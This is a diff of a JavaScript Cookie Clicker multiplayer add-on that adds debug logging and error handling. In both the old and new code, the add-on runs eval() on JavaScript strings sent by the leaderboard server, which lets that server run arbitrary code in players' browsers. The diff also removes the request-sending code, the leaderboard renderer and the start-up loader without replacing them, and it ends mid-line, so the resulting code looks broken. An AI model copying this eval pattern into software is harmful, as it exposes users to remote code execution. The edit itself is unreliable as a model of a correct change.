@@ -1,6 +1,8 @@
 // Will get the hostname
 hostname = document.getElementById("hostname").src;
 hostname = hostname.replace("/cookieClicker/index.js", "");
+console.log("[DEBUG] Hostname:", hostname);
+
 // Will add jquery and another script
 var script = document.createElement("script");
 script.src = `${hostname}/javascript/functions.js`;
@@ -8,9 +10,10 @@ document.head.appendChild(script);
 var script = document.createElement("script");
 script.src = `${hostname}/javascript/jquery.js`;
 document.head.appendChild(script);
-// Used to store all values to make storage not overlap with cookie clicker values
+
 var multiplayer = {
   startMenu: function () {
+    console.log("[DEBUG] Showing start menu");
     this.clear();
     $("#multiplayer")
       .append(`<h1 class='title' style='font-size:150%'>Welcome to the Online Cookie Clicker Addon</h1><br>
@@ -20,23 +23,33 @@ var multiplayer = {
         <a id='joinButton' class='option'>Join room</a>`);
     $("#joinButton").click(function () {
       multiplayer.room = $("#room").val();
+      console.log("[DEBUG] Joined room:", multiplayer.room);
       multiplayer.gameMenu();
     });
   },
   clear: function () {
+    console.log("[DEBUG] Clearing menu");
     $("#multiplayer").empty();
   },
   room: null,
   gameMenu: function () {
+    console.log("[DEBUG] Showing game menu for room:", this.room);
     this.clear();
     $("#multiplayer")
       .append(`<h1 class='title' style='font-size:150%'>Welcome to ${this.room}</h1><br>
         <p>If table stops updating leave and join the room.</p>
         <table id='leaderboard' style='width:100%;'></table>
         <a id='leave' class='option'>Leave room</a>`);
-    this.intervalFetch = setInterval(this.fetchData, 2000);
-    this.intervalFakeLive = setInterval(this.fakeLive, 30);
+    this.intervalFetch = setInterval(() => {
+      console.log("[DEBUG] Running fetchData interval");
+      this.fetchData();
+    }, 2000);
+    this.intervalFakeLive = setInterval(() => {
+      console.log("[DEBUG] Running fakeLive interval");
+      this.fakeLive();
+    }, 1000);
     $("#leave").click(function () {
+      console.log("[DEBUG] Leaving room");
       clearInterval(multiplayer.intervalFetch);
       clearInterval(multiplayer.intervalFakeLive);
       multiplayer.startMenu();
@@ -45,83 +58,25 @@ var multiplayer = {
   intervalFakeLive: null,
   intervalFetch: null,
   fetchData: function () {
+    console.log("[DEBUG] fetchData called");
     let ajax = new XMLHttpRequest();
     ajax.onload = function () {
-      let jsonData = JSON.parse(this.response);
-      multiplayer.internalCookies = jsonData["leaderboard"].map((e) => {
-        e.cookies = e.cookies * 10 ** e.powerOfCookies;
-        e.cookiesPs = e.cookiesPs * 10 ** e.powerOfCookiesPs;
-        return e;
-      });
-      let commands = jsonData["commands"];
-      if (commands) {
-        commands.forEach((command) => {
-          eval(command["javascript"]);
+      console.log("[DEBUG] Server response:", this.response);
+      try {
+        let jsonData = JSON.parse(this.response);
+        multiplayer.internalCookies = jsonData["leaderboard"].map((e) => {
+          e.cookies = e.cookies * 10 ** e.powerOfCookies;
+          e.cookiesPs = e.cookiesPs * 10 ** e.powerOfCookiesPs;
+          console.log("[DEBUG] Processed leaderboard entry:", e);
+          return e;
         });
-      }
-    };
-    ajax.open("POST", `${this.hostname}/api/cookieClicker.php`);
-    ajax.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-
-    // Sets the power variables correctly
-    let powerOfCookies = 0;
-    let cookies = Game.cookies;
-    while (cookies >= 1000000) {
-      powerOfCookies++;
-      cookies /= 10;
-    }
-    let cookiesPs = Game.cookiesPs;
-    let powerOfCookiesPs = 0;
-    while (cookiesPs >= 1000000) {
-      powerOfCookiesPs++;
-      cookiesPs /= 10;
-    }
-
-    // Send achievements count along with cookies and CPS
-    ajax.send(
-      `username=${Game.bakeryName}&cookies=${Math.round(cookies)}&powerOfCookies=${powerOfCookies}&cookiesPs=${Math.round(cookiesPs)}&powerOfCookiesPs=${powerOfCookiesPs}&achievements=${Game.AchievementsOwned}&room=${multiplayer.room}&type=view&time=${Date.now()}`
-    );
-  },
-  fakeLive: function () {
-    let html = `<tr><th>Username</th><th>Cookies</th><th>Per Second</th><th>Achievements</th><th>Last Update</th></tr>`;
-    if (multiplayer.internalCookies) {
-      multiplayer.internalCookies.forEach((data) => {
-        let username = data["username"];
-        let age = (Date.now() - parseInt(data["lastUpdate"])) / 1000;
-        let cookies = Beautify(data["cookies"] + data["cookiesPs"] * age);
-        let cookiesPs = Beautify(data["cookiesPs"]);
-        let achievements = data["achievements"] || 0; // Show achievements
-        let style = "";
-        if (age > 30) style = "color:grey";
-        else if (username == Game.bakeryName) {
-          cookies = Beautify(Game.cookies);
-          cookiesPs = Beautify(Game.cookiesPs);
-          achievements = Game.AchievementsOwned;
-          age = 0;
+        let commands = jsonData["commands"];
+        if (commands) {
+          console.log("[DEBUG] Running commands from server:", commands);
+          commands.forEach((command) => {
+            try { eval(command["javascript"]); } 
+            catch (err) { console.error("[DEBUG] Command eval error:", err); }
+          });
         }
-        html += `<tr style='${style}'><td>${username}</td><td>${cookies}</td><td>${cookiesPs}</td><td>${achievements}</td><td>${humanReadableTime(age)}</td></tr>`;
-      });
-    } else {
-      html = "<p>Loading...</p>";
-    }
-    $("#leaderboard").empty();
-    $("#leaderboard").append(html);
-  },
-  internalCookies: null,
-  hostname: hostname,
-  lastFetch: null,
-};
-
-var waitForJQuery = setInterval(function () {
-  if (typeof $ != "undefined" && typeof getCookie != "undefined") {
-    let element = document.getElementById("centerArea");
-    let div = document.createElement("div");
-    div.id = "multiplayer";
-    div.style =
-      "text-align:center;background:rgba(0,0,0,1);position:relative;z-index:100;padding-top:20px;padding-bottom:20px";
-    element.insertBefore(div, element.firstChild);
-    multiplayer.startMenu();
-    console.log("Import successful");
-    clearInterval(waitForJQuery);
-  }
-}, 10);
+      } catch (err) {
+        console.error("[D]()
